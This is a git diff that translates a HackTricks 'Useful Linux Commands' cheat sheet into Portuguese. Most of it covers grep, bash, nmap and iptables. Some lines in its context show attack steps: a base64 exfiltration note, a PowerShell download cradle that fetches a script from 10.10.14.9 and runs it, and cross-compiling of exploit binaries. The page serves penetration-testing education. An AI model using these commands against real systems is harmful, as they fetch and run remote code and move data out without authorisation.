@@ -1,10 +1,9 @@
-# Useful Linux Commands
+# Comandos Úteis do Linux
 
 ![](<../../.gitbook/assets/image (9) (1) (2).png>)
 
-\
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
+Acesse hoje:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
@@ -12,16 +11,15 @@ Get Access Today:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## Common Bash
-
+## Bash Comum
 ```bash
 #Exfiltration using Base64
 base64 -w 0 file
@@ -140,17 +138,14 @@ sudo chattr -i file.txt #Remove the bit so you can delete it
 # List files inside zip
 7z l file.zip
 ```
-
 ![](<../../.gitbook/assets/image (9) (1) (2).png>)
 
-\
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Use o [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e automatizar facilmente fluxos de trabalho com as ferramentas de comunidade mais avançadas do mundo.\
+Obtenha acesso hoje:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
 
-## Bash for Windows
-
+## Bash para Windows
 ```bash
 #Base64 for Windows
 echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
@@ -170,9 +165,80 @@ python pyinstaller.py --onefile exploit.py
 #sudo apt-get install gcc-mingw-w64-i686
 i686-mingw32msvc-gcc -o executable useradd.c
 ```
-
 ## Greps
 
+O comando `grep` é usado para pesquisar por padrões em arquivos ou saídas de comandos. É uma ferramenta muito útil para encontrar informações específicas em grandes quantidades de dados.
+
+### Sintaxe básica
+
+```
+grep <padrão> <arquivo>
+```
+
+### Opções úteis
+
+- `-i`: ignora diferenças entre letras maiúsculas e minúsculas.
+- `-r`: pesquisa recursivamente em diretórios e subdiretórios.
+- `-n`: mostra o número da linha em que o padrão foi encontrado.
+- `-v`: mostra as linhas que não contêm o padrão.
+- `-E`: permite o uso de expressões regulares estendidas.
+- `-e`: permite a pesquisa de vários padrões.
+
+### Exemplos
+
+- Pesquisar por um padrão em um arquivo:
+
+```
+grep "padrão" arquivo.txt
+```
+
+- Pesquisar por um padrão em vários arquivos:
+
+```
+grep "padrão" arquivo1.txt arquivo2.txt arquivo3.txt
+```
+
+- Pesquisar por um padrão em todos os arquivos de um diretório:
+
+```
+grep "padrão" *
+```
+
+- Pesquisar por um padrão em todos os arquivos de um diretório e subdiretórios:
+
+```
+grep -r "padrão" *
+```
+
+- Pesquisar por um padrão em um arquivo ignorando diferenças entre letras maiúsculas e minúsculas:
+
+```
+grep -i "padrão" arquivo.txt
+```
+
+- Pesquisar por um padrão em um arquivo e mostrar o número da linha em que foi encontrado:
+
+```
+grep -n "padrão" arquivo.txt
+```
+
+- Pesquisar por um padrão em um arquivo e mostrar as linhas que não contêm o padrão:
+
+```
+grep -v "padrão" arquivo.txt
+```
+
+- Pesquisar por um padrão usando uma expressão regular:
+
+```
+grep -E "padrão1|padrão2" arquivo.txt
+```
+
+- Pesquisar por vários padrões em um arquivo:
+
+```
+grep -e "padrão1" -e "padrão2" arquivo.txt
+```
 ```bash
 #Extract emails from file
 grep -E -o "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" file.txt
@@ -252,25 +318,86 @@ grep -Po 'd{3}[s-_]?d{3}[s-_]?d{4}' *.txt > us-phones.txt
 #Extract ISBN Numbers
 egrep -a -o "\bISBN(?:-1[03])?:? (?=[0-9X]{10}$|(?=(?:[0-9]+[- ]){3})[- 0-9X]{13}$|97[89][0-9]{10}$|(?=(?:[0-9]+[- ]){4})[- 0-9]{17}$)(?:97[89][- ]?)?[0-9]{1,5}[- ]?[0-9]+[- ]?[0-9]+[- ]?[0-9X]\b" *.txt > isbn.txt
 ```
-
-## Nmap search help
-
+## Ajuda na busca do Nmap
 ```bash
 #Nmap scripts ((default or version) and smb))
 nmap --script-help "(default or version) and *smb*"
 locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
 nmap --script-help "(default or version) and smb)"
 ```
-
 ## Bash
 
+Bash é um shell de linha de comando para sistemas operacionais baseados em Unix. Ele é usado para executar comandos e scripts, bem como automatizar tarefas do sistema. Aqui estão alguns comandos úteis do Bash:
+
+- `cd`: muda o diretório atual.
+- `ls`: lista o conteúdo do diretório atual.
+- `mkdir`: cria um novo diretório.
+- `rm`: remove um arquivo ou diretório.
+- `cp`: copia um arquivo ou diretório.
+- `mv`: move ou renomeia um arquivo ou diretório.
+- `cat`: exibe o conteúdo de um arquivo.
+- `grep`: pesquisa por uma string em um arquivo ou saída de comando.
+- `chmod`: altera as permissões de um arquivo ou diretório.
+- `sudo`: executa um comando com privilégios de superusuário.
+- `echo`: exibe uma mensagem na saída padrão.
+- `export`: define uma variável de ambiente.
+- `source`: executa um script no shell atual.
+- `history`: exibe o histórico de comandos executados no shell.
 ```bash
 #All bytes inside a file (except 0x20 and 0x00)
 for j in $((for i in {0..9}{0..9} {0..9}{a..f} {a..f}{0..9} {a..f}{a..f}; do echo $i; done ) | sort | grep -v "20\|00"); do echo -n -e "\x$j" >> bytes; done
 ```
-
 ## Iptables
 
+Iptables é um firewall de pacotes para o kernel do Linux. Ele permite que você configure regras para controlar o tráfego de entrada e saída do seu sistema. As regras são organizadas em "tabelas", que são compostas por "cadeias" de regras. As tabelas mais comuns são `filter`, `nat` e `mangle`.
+
+### Listando as regras
+
+Para listar todas as regras do iptables, execute o seguinte comando:
+
+```bash
+iptables -L -n -v
+```
+
+### Limpando as regras
+
+Para limpar todas as regras do iptables, execute o seguinte comando:
+
+```bash
+iptables -F
+```
+
+### Bloqueando um endereço IP
+
+Para bloquear um endereço IP específico, execute o seguinte comando:
+
+```bash
+iptables -A INPUT -s <endereço IP> -j DROP
+```
+
+### Permitindo uma porta específica
+
+Para permitir o tráfego em uma porta específica, execute o seguinte comando:
+
+```bash
+iptables -A INPUT -p tcp --dport <número da porta> -j ACCEPT
+```
+
+### Salvando as regras
+
+Para salvar as regras do iptables, execute o seguinte comando:
+
+```bash
+iptables-save > /etc/iptables/rules.v4
+```
+
+### Carregando as regras salvas
+
+Para carregar as regras salvas do iptables, execute o seguinte comando:
+
+```bash
+iptables-restore < /etc/iptables/rules.v4
+```
 ```bash
 #Delete curent rules and chains
 iptables --flush
@@ -301,23 +428,22 @@ iptables -P INPUT DROP
 iptables -P FORWARD ACCEPT
 iptables -P OUTPUT ACCEPT
 ```
-
 <details>
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
 ![](<../../.gitbook/assets/image (9) (1) (2).png>)
 
 \
-Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
-Get Access Today:
+Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas comunitárias mais avançadas do mundo.\
+Obtenha acesso hoje:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
